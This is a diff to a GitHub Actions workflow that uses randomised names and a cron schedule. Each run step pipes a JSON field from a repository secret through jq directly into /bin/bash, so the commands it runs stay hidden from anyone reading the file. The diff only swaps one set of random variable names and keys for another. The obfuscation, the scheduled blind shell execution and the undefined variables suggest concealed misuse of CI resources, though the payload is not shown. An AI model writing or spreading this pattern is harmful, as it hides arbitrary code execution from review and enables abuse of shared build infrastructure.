@@ -2,8 +2,8 @@ name: xueqingfeng8712
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
-jobs:  # 9704
+    - cron: '11 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +11,18 @@ jobs:  # 9704
       - uses: actions/checkout@v4
       - name: xueqingfeng8712
         env:
-          gkfn02: ${{ secrets.gkfn02 }}
+          ivj135: ${{ secrets.ivj135 }}
         run: |
-          echo $gkfn02 | jq -r .qija93 | /bin/bash
-          echo $lr99962 | jq -r .bon3 | /bin/bash
-          echo $ufuct0 | jq -r .oz8 | /bin/bash
-          echo $tqe165 | jq -r .yky595 | /bin/bash
-          echo $peao4757 | jq -r .xhqc9022 | /bin/bash
-          echo $vwxw26 | jq -r .ysl49570 | /bin/bash
-          echo $joosz83713 | jq -r .cj26190 | /bin/bash
-          echo $b7 | jq -r .h3969 | /bin/bash
-          echo $yo49401 | jq -r .cwo725 | /bin/bash
-          echo $w6602 | jq -r .upb44 | /bin/bash
-          echo $xskpu5357 | jq -r .ppr430 | /bin/bash
+          echo $ivj135 | jq -r .yfhog7 | /bin/bash
+          echo $vtxqf1 | jq -r .sntss2 | /bin/bash
+          echo $rvyzl94702 | jq -r .gh7848 | /bin/bash
+          echo $b87031 | jq -r .m8 | /bin/bash
+          echo $p5693 | jq -r .fgvl94 | /bin/bash
+          echo $fdkg93 | jq -r .qsf7 | /bin/bash
+          echo $hbryb639 | jq -r .uhrp6927 | /bin/bash
+          echo $t5032 | jq -r .o809 | /bin/bash
+          echo $yiuk5544 | jq -r .m3 | /bin/bash
+          echo $x3 | jq -r .fqpio2 | /bin/bash
+          echo $awts01 | jq -r .ulmrc85025 | /bin/bash
+          echo $nypv81 | jq -r .wmho6817 | /bin/bash
 
